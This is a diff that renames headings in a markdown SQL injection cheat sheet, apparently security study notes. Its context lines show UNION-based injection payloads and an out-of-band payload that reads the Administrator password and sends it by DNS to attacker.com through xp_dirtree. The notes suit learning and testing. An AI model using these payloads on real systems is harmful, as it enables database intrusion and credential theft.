@@ -48,7 +48,7 @@
     ```
 * Note: the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results
 
-### Finding columns with a useful data type
+### Column data types
 
 * Do you want a string?
   * ```
@@ -59,7 +59,7 @@
     ```
   * If no error occurs and the response includes the injected string, the column is suitable for retrieving string data.
 
-### Examining the database
+### Examining database
 
 * `' UNION SELECT @@version--`
 * Most database types (except Oracle) have a set of views called the information schema
@@ -194,7 +194,7 @@ An application might carry out a SQL query asynchronously (another thread execut
 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
 ```
 
-## Small tips
+## Tips
 
 * Sometimes when you try to break syntax you receive a response that does not indicate the parameter is vulnerable. <mark style="color:purple;">**Check if there is a "default" \[error] response**</mark> or <mark style="color:purple;">**Build a valid query**</mark> that provides a response indicating the parameter is vulnerable ... Example:
   * &#x20;`/stockcheck?productID=1` and the response tell you 3 units (stock check)
